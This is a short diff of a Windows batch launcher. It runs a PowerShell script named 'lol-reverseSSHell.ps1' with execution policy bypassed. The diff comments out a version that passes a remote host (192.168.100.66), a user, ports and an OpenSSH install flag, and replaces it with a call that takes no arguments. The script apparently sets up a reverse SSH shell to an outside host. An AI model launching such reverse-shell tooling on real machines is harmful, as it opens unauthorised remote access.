@@ -29,5 +29,5 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 :--------------------------------------
  
-START Powershell.exe -executionpolicy bypass -Command  "%~dp0lol-reverseSSHell.ps1 -DestinationUserName \"aj\" -DestinationHost \"192.168.100.66\" -DestinationPort \"22\" -DestinationBindLocalPort \"7777\" -InstallOpenSSHServer \"yes\" "
- 
+REM  -- > START Powershell.exe -executionpolicy bypass -Command  "%~dp0lol-reverseSSHell.ps1 -DestinationUserName \"aj\" -DestinationHost \"192.168.100.66\" -DestinationPort \"22\" -DestinationBindLocalPort \"7777\" -InstallOpenSSHServer \"yes\" "
+START Powershell.exe -executionpolicy bypass -Command  "%~dp0lol-reverseSSHell.ps1 " 
